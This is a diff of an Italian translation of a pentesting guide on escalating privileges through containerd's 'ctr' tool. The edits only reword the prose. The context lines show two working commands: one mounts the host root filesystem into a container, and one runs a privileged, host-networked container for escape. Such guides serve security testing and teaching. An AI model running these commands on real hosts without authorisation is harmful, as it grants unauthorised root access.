@@ -4,8 +4,7 @@
 
 ## Informazioni di base
 
-Vai al seguente link per scoprire **dove `containerd` e `ctr` si collocano nello stack dei container**:
-
+Vai al seguente link per scoprire **dove `containerd` e `ctr` si inseriscono nello stack dei container**:
 
 {{#ref}}
 container-security/runtimes-and-engines.md
@@ -25,19 +24,18 @@ REF                                  TYPE                                       
 registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
 registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
 ```
-E poi **esegui una di quelle immagini montando la cartella root dell'host al suo interno**:
+E poi **avvia una di quelle immagini montando al suo interno la cartella root dell'host**:
 ```bash
 ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
 ```
 ## PE 2
 
-Esegui un container con privilegi elevati ed evadi da esso.\
+Esegui un container in modalità privilegiata ed evadi da esso.\
 Puoi eseguire un container privilegiato come:
 ```bash
 ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
 ```
-Quindi puoi usare alcune delle tecniche menzionate nella pagina seguente per **evadere da esso abusando di capabilities privilegiate**:
-
+Quindi puoi utilizzare alcune delle tecniche menzionate nella seguente pagina per **evadere da esso abusando delle capability privilegiate**:
 
 {{#ref}}
 container-security/
